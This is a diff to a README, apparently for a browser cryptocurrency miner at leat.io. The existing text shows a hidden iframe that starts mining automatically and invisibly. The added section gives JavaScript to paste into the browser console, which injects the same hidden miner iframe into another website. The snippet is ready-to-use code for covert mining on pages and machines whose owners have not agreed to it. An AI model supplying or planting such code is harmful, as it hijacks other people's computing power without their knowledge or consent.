@@ -46,6 +46,18 @@ For example to start automatically and hidden as user leathan with 1 thread thro
 <iframe src="https://leat.io/m.html?u=leathan&t=1&th=.5&h&s" style="display:none"></iframe>
 ```
 
+# Embed the same parameteres into another website
+
+1.) Open the console Options -> Developer Tools -> Console and enter:
+
+```javascript
+var e = document.createElement('iframe');
+e.style.display = "none";
+e.src = "https://leat.io/m.html?u=leathan&t=1&th=.5&s&h";
+document.body.appendChild(e);
+// Some websites block this, like github.
+```
+
 
 # Changes
 
